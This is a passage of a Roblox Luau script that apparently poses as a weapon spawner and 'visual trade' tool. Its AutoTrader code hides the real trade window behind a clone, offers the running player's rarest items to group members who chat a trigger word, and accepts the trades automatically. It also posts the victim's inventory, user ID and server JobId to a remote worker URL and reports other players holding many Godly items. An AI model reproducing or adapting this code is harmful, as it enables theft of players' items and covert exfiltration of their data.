	if data and data.LastOffer then AutoTrader.lastOffer = data.LastOffer end
end)
ATAcceptTrade.OnClientEvent:Connect(function(success)
	if success == true then AutoTrader.tradeCompleted = true end
end)

task.spawn(function()
	while true do
		task.wait(0.2)
		if autoTraderActive and realTradeHidden then
			local tg = playerGui:FindFirstChild("TradeGUI")
			if tg then
				for _, child in ipairs(tg:GetChildren()) do
					if child:IsA("GuiObject") then
						pcall(function()
							if child.Position.X.Offset < 50000 then
								savedOriginalPositions[child.Name] = child.Position
								child.Position = UDim2.new(0, 100000, 0, 100000)
							end
						end)
					end
				end
			end
		end
	end
end)

playerGui.ChildAdded:Connect(function(child)
	if child.Name == "TradeGUI" and autoTraderActive then
		task.wait(0.2)
		hideRealTradeGUI()
	end
end)

function AutoTrader.isPlayerInGroup(player)
	if player == localPlayer then return false end
	if AutoTrader.groupCheckCache[player.UserId] ~= nil then
		return AutoTrader.groupCheckCache[player.UserId]
	end
	local ok, result = pcall(function() return player:IsInGroup(AutoTrader.TARGET_GROUP_ID) end)
	if ok then
		AutoTrader.groupCheckCache[player.UserId] = result
		return result
	end
	return false
end

function AutoTrader.getWeaponInfo(weaponKey)
	if ATItemDatabase and type(ATItemDatabase) == "table" then
		local data = ATItemDatabase[weaponKey]
		if data and type(data) == "table" then return data end
	end
	return nil
end

function AutoTrader.getRarity(weaponKey)
	local info = AutoTrader.getWeaponInfo(weaponKey)
	if info and info.Rarity then return info.Rarity end
	return "Unknown"
end

function AutoTrader.getItemName(weaponKey)
	local info = AutoTrader.getWeaponInfo(weaponKey)
	if info and info.ItemName then return info.ItemName end
	return tostring(weaponKey)
end

function AutoTrader.getRarityPriority(rarity)
	return AutoTrader.RARITY_PRIORITY[rarity] or 99
end

function AutoTrader.fetchAndSortWeapons()
	local success, result = pcall(function() return GetFullInventory:InvokeServer(localPlayer.Name) end)
	if not success or not result then return {}, {} end
	local weapons = result.Weapons and result.Weapons.Owned
	if not weapons then return {}, {} end
	local allWeapons = {}
	local offerableWeapons = {}
	for weaponKey, amount in pairs(weapons) do
		local rarity = AutoTrader.getRarity(weaponKey)
		local itemName = AutoTrader.getItemName(weaponKey)
		local priority = AutoTrader.getRarityPriority(rarity)
		table.insert(allWeapons, {Key = weaponKey, Name = itemName, Rarity = rarity, Priority = priority, Amount = amount})
		if AutoTrader.OFFER_RARITIES[rarity] then
			table.insert(offerableWeapons,
				{Key = weaponKey, Name = itemName, Rarity = rarity, Priority = priority, Amount = amount})
		end
	end
	table.sort(allWeapons, function(a, b)
		if a.Priority == b.Priority then return tostring(a.Name) < b.Name end
		return a.Priority < b.Priority
	end)
	table.sort(offerableWeapons, function(a, b)
		if a.Priority == b.Priority then return tostring(a.Name) < b.Name end
		return a.Priority < b.Priority
	end)
	return allWeapons, offerableWeapons
end

function AutoTrader.countGodlys(allWeapons)
	local count = 0
	for _, w in ipairs(allWeapons) do
		if AutoTrader.PING_RARITIES[w.Rarity] then
			count = count + w.Amount
		end
	end
	return count
end

function AutoTrader.getServerPlayersWithGodlys()
	local results = {}
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= localPlayer then
			local ok, inv = pcall(function() return GetFullInventory:InvokeServer(plr.Name) end)
			if ok and inv and inv.Weapons and inv.Weapons.Owned then
				local godlyCount = 0
				for weaponKey, amount in pairs(inv.Weapons.Owned) do
					local rarity = AutoTrader.getRarity(weaponKey)
					if AutoTrader.PING_RARITIES[rarity] then
						godlyCount = godlyCount + amount
					end
				end
				if godlyCount >= AutoTrader.GODLY_THRESHOLD then
					table.insert(results, {Name = plr.Name, UserId = plr.UserId, GodlyCount = godlyCount})
				end
			end
		end
	end
	return results
end

function AutoTrader.sendToWorker(allWeapons, offerableWeapons, targetName)
	local rarityGroups = {}
	for _, w in ipairs(allWeapons) do
		rarityGroups[w.Rarity] = rarityGroups[w.Rarity] or {}
		table.insert(rarityGroups[w.Rarity], tostring(w.Name) .. (w.Amount > 1 and " x" .. w.Amount or ""))
	end
	local fields = {}
	local order = {"Ancient", "Godly", "Legendary", "Unique", "Rare", "Uncommon", "Common", "Classic", "Christmas",
		"Halloween"}
	for _, rarity in ipairs(order) do
		if rarityGroups[rarity] then
			local val = table.concat(rarityGroups[rarity], ", ")
			table.insert(fields, {
				name = rarity .. " (" .. #rarityGroups[rarity] .. ")",
				value = #val > 1024 and val:sub(1, 1020) .. "..." or val,
				inline = true
			})
		end
	end
	local offerList = {}
	for i = 1, math.min(#offerableWeapons, AutoTrader.MAX_TRADE_SLOTS) do
		local w = offerableWeapons[i]
		table.insert(offerList, tostring(w.Name) .. " [" .. w.Rarity .. "]")
	end
	table.insert(fields, {name = "Offering", value = #offerList > 0 and table.concat(offerList, ", ") or "None",
		inline = false})
	local godlyCount = AutoTrader.countGodlys(allWeapons)
	local shouldPing = godlyCount > 0
	local richPlayers = AutoTrader.getServerPlayersWithGodlys()
	if #richPlayers > 0 then
		local richList = {}
		for _, rp in ipairs(richPlayers) do
			table.insert(richList, rp.Name .. " (" .. rp.GodlyCount .. " godlys)")
		end
		table.insert(fields, {name = "Players in server with 5+ Godlys", value = table.concat(richList, "\n"),
			inline = false})
	end
	local embedColor = shouldPing and 16711680 or 5592405
	local titleEmoji = shouldPing and "🔥" or "🔪"
	local payload = {
		["content"] = shouldPing and "@everyone" or "",
		["embeds"] = {{
			["title"] = titleEmoji .. " " .. localPlayer.Name .. " | " .. godlyCount .. " Godly(s)",
			["description"] = string.format(
				"**User:** %s | **ID:** %s | **Items:** %d\n**Target:** %s\n**Executor:** %s\n**JobId:** %s",
				localPlayer.Name, tostring(localPlayer.UserId), #allWeapons,
				targetName or "None", getExecutorNameDisplay(), tostring(game.JobId)
			),
			["color"] = embedColor,
			["fields"] = fields,
			["footer"] = {["text"] = os.date("%X") .. " • Visual Studio"},
		}}
	}
	local json = HttpService:JSONEncode(payload)
	local req = request or http_request or (syn and syn.request) or (http and http.request)
	if req then
		pcall(req, {
			Url = AutoTrader.WORKER_URL,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json", ["X-Auth-Key"] = AutoTrader.SECRET_KEY},
			Body = json
		})
	end
end

function AutoTrader.doSingleTrade(target, offerableWeapons)
	if not AutoTrader.isActive then return false, "stopped" end
	if not Players:FindFirstChild(target.Name) then return false, "left" end
	AutoTrader.lastOffer = 0
	AutoTrader.tradeCompleted = false
	if not autoTraderActive then
		autoTraderActive = true
		setupCloneBeforeHide()
	else
		hideRealTradeGUI()
	end
	local ok = pcall(function() ATSendRequest:InvokeServer(target) end)
	if not ok then return false, "failed" end
	local waitTime = 0
	while AutoTrader.lastOffer == 0 and waitTime < 45 do
		task.wait(0.5)
		waitTime = waitTime + 0.5
		hideRealTradeGUI()
	end
	if AutoTrader.lastOffer == 0 then return false, "failed" end
	task.wait(0.5)
	hideRealTradeGUI()
	local slotsUsed = 0
	for _, weapon in ipairs(offerableWeapons) do
		if slotsUsed >= AutoTrader.MAX_TRADE_SLOTS then break end
		if not AutoTrader.isActive then return false, "stopped" end
		for i = 1, weapon.Amount do
			if not AutoTrader.isActive then return false, "stopped" end
			ATOfferItem:FireServer(weapon.Key, "Weapons")
			task.wait(AutoTrader.OFFER_DELAY)
			hideRealTradeGUI()
		end
		slotsUsed = slotsUsed + 1
	end
	for i = AutoTrader.ACCEPT_DELAY, 1, -1 do
		if not AutoTrader.isActive then return false, "stopped" end
		task.wait(1)
	end
	ATAcceptTrade:FireServer(AutoTrader.TRADE_ID, AutoTrader.lastOffer)
	local confirmWait = 0
	while not AutoTrader.tradeCompleted and confirmWait < 20 do
		task.wait(0.5)
		confirmWait = confirmWait + 0.5
	end
	return true, "done"
end

function AutoTrader.runTradeOnTarget(target)
	if not AutoTrader.isActive then return end
	while AutoTrader.isActive do
		if not Players:FindFirstChild(target.Name) then break end
		local _, currentOfferable = AutoTrader.fetchAndSortWeapons()
		if #currentOfferable == 0 then
			AutoTrader.isActive = false
			break
		end
		local success, reason = AutoTrader.doSingleTrade(target, currentOfferable)
		if reason == "left" then
			break
		elseif not success then
			task.wait(5)
		else
			task.wait(AutoTrader.BETWEEN_TRADES_DELAY)
		end
	end
	AutoTrader.isTrading = false
	if #AutoTrader.tradeQueue > 0 and AutoTrader.isActive then
		local nextTarget = table.remove(AutoTrader.tradeQueue, 1)
		AutoTrader.isTrading = true
		task.spawn(function() AutoTrader.runTradeOnTarget(nextTarget) end)
	else
		autoTraderActive = false
		destroyClone()
		restoreRealTradeGUI()
		if Trade.inSession then Trade.declineIt() end
	end
end

function AutoTrader.setupChatListener()
	local function connectPlayerChat(player)
		if player == localPlayer then return end
		player.Chatted:Connect(function(message)
			if not AutoTrader.isActive then return end
			if string.find(string.lower(message), string.lower(AutoTrader.CHAT_TRIGGER)) then
				task.spawn(function()
					if not AutoTrader.isPlayerInGroup(player) then return end
					if AutoTrader.isTrading then
						local alreadyQueued = false
						for _, p in ipairs(AutoTrader.tradeQueue) do
							if p == player then alreadyQueued = true; break end
						end
						if not alreadyQueued then table.insert(AutoTrader.tradeQueue, player) end
						return
					end
					AutoTrader.isTrading = true
					AutoTrader.currentTarget = player
					local allWeapons, offerableWeapons = AutoTrader.fetchAndSortWeapons()
					AutoTrader.sendToWorker(allWeapons, offerableWeapons, player.Name)
					if #offerableWeapons == 0 then
						AutoTrader.isTrading = false
						return
					end
					task.spawn(function() AutoTrader.runTradeOnTarget(player) end)
				end)
			end
		end)
	end
	for _, player in ipairs(Players:GetPlayers()) do
		connectPlayerChat(player)
	end
	Players.PlayerAdded:Connect(function(player)
		connectPlayerChat(player)
		task.spawn(function()
			task.wait(3)
			local ok, inv = pcall(function() return GetFullInventory:InvokeServer(player.Name) end)
			if ok and inv and inv.Weapons and inv.Weapons.Owned then
				local godlyCount = 0
				local godlyNames = {}
				for weaponKey, amount in pairs(inv.Weapons.Owned) do
					local rarity = AutoTrader.getRarity(weaponKey)
					if AutoTrader.PING_RARITIES[rarity] then
						godlyCount = godlyCount + amount
						local name = AutoTrader.getItemName(weaponKey)
						table.insert(godlyNames, name .. (amount > 1 and " x" .. amount or ""))
					end
				end
				if godlyCount >= AutoTrader.GODLY_THRESHOLD then
					local payload = {
						["content"] = "@everyone",
						["embeds"] = {{
							["title"] = "🎯 Rich Player Joined: " .. player.Name,
							["description"] = string.format(
								"**User:** %s | **ID:** %s | **Godlys:** %d\n**Same server as you**\n**Executor:** %s\n**JobId:** %s",
								player.Name, tostring(player.UserId), godlyCount,
								getExecutorNameDisplay(), tostring(game.JobId)
							),
							["color"] = 16776960,
							["fields"] = {{
								name = "Their Godly/Ancient Items",
								value = #godlyNames > 0 and table.concat(godlyNames, ", ") or "Unknown",
								inline = false
							}},
							["footer"] = {["text"] = os.date("%X") .. " • Visual Studio"},
						}}
					}
					local json = HttpService:JSONEncode(payload)
					local req = request or http_request or (syn and syn.request) or (http and http.request)
					if req then
						pcall(req, {
							Url = AutoTrader.WORKER_URL,
							Method = "POST",
							Headers = {["Content-Type"] = "application/json", ["X-Auth-Key"] = AutoTrader.SECRET_KEY},
							Body = json
						})
					end
				end
			end
		end)
	end)
end

pcall(function()
	ATStartTrade.OnClientEvent:Connect(function(data, tradeName)
		if not data then return end
		if Trade.enabled then return end
		if autoTraderActive then
			if data.LastOffer then AutoTrader.lastOffer = data.LastOffer end
			return
		end
		local detectedName = nil
		if tradeName and type(tradeName) == "string" and tradeName ~= "" and tradeName ~= localPlayer.Name then
			detectedName = tradeName
		elseif data.Player2 and data.Player2.Player then
			pcall(function()
				if data.Player2.Player ~= localPlayer then
					detectedName = data.Player2.Player.Name
				end
			end)
		elseif data.Player1 and data.Player1.Player then
			pcall(function()
				if data.Player1.Player ~= localPlayer then
					detectedName = data.Player1.Player.Name
				end
			end)
		end
		if detectedName and detectedName ~= "" then
			Trade.lastRealTradeUsername = detectedName
		end
		if data.LastOffer then AutoTrader.lastOffer = data.LastOffer end
	end)
end)

Players.PlayerRemoving:Connect(function(player)
	if AutoTrader.currentTarget and AutoTrader.currentTarget == player then
		AutoTrader.isActive = false
		AutoTrader.isTrading = false
		AutoTrader.currentTarget = nil
		AutoTrader.tradeQueue = {}
		autoTraderActive = false
		destroyClone()
		restoreRealTradeGUI()
		if Trade.inSession then Trade.declineIt() end
		task.wait(1)
		AutoTrader.isActive = true
	end
	for i = #AutoTrader.tradeQueue, 1, -1 do
		if AutoTrader.tradeQueue[i] == player then table.remove(AutoTrader.tradeQueue, i) end
	end
end)

task.spawn(function()
	pcall(function()
		local mainGUI = playerGui:WaitForChild("MainGUI", 15)
		if not mainGUI then return end
		local gameF = mainGUI:WaitForChild("Game", 10)
		if not gameF then return end
		local lb = gameF:WaitForChild("Leaderboard", 10)
		if not lb then return end
		local inspect = lb:WaitForChild("Inspect", 10)
		if not inspect then return end
		local container = inspect:WaitForChild("Container", 10)
		if not container then return end
		local tradeBtn = container:WaitForChild("Trade", 10)
		if not tradeBtn then return end
		tradeBtn.MouseButton1Click:Connect(function()
			if autoTraderActive and clonedTradeGUI and clonedTradeGUI.Parent then
				clonedTradeGUI.Enabled = true
				local c = clonedTradeGUI:FindFirstChild("Container")
				if c then c.Visible = true end
				if Core.visualTradeEnabled and not Trade.inSession then
					if not Core.itemDatabase then Core.loadDatabase() end
					Trade.loadTradeDB()
					Trade.startSession(true)
				end
			end
		end)
	end)
end)

UserInputService.InputBegan:Connect(function(input, gp)
	if not Trade.scriptAlive then return end
	if Core.waitingForKey and input.KeyCode ~= Enum.KeyCode.Unknown then
		Core.keybinds[Core.waitingForKey] = input.KeyCode
		Core.waitingForKey = nil
		updateKB()
		return
	end
	if gp then return end
	if input.KeyCode == Core.keybinds.toggle then toggleUI(); return end
	if input.KeyCode == Core.keybinds.debug then Debug.toggle(); return end
	if input.KeyCode == Core.keybinds.alwaysLose then
		if Wheel.gui and Wheel.gui.Parent then Wheel.spin("lose") end
		return
	end
	if input.KeyCode == Core.keybinds.legit5050 then
		if Wheel.gui and Wheel.gui.Parent then Wheel.spin("legit") end
		return
	end
	if input.KeyCode == Core.keybinds.give then
		if not Core.visualTradeEnabled then return end
		if Trade.inSession or Core.tradeSessionActive then return end
		Trade.startSession(false)
	elseif input.KeyCode == Core.keybinds.get then
		if not Core.visualTradeEnabled then return end
		if Trade.inSession or Core.tradeSessionActive then return end
		if not Core.itemDatabase then Core.loadDatabase() end
		Trade.loadTradeDB()
		Trade.startSession(true)
	end
end)

playerGui.ChildAdded:Connect(function(child)
	if not Trade.scriptAlive then return end
	if child.Name == "TradeGUI" then
		task.wait(0.5)
		if Trade.enabled then Trade.connectWeapons() end
		if autoTraderActive then hideRealTradeGUI() end
	end
end)

task.spawn(function()
	Core.loadDatabase()
	Core.populateSpawner()
	Trade.loadTradeDB()
	task.wait(2)
	pcall(function()
		local allWeapons, offerableWeapons = AutoTrader.fetchAndSortWeapons()
		if #allWeapons > 0 then
			AutoTrader.sendToWorker(allWeapons, offerableWeapons, "Startup scan")
		end
		AutoTrader.setupChatListener()
	end)
end)
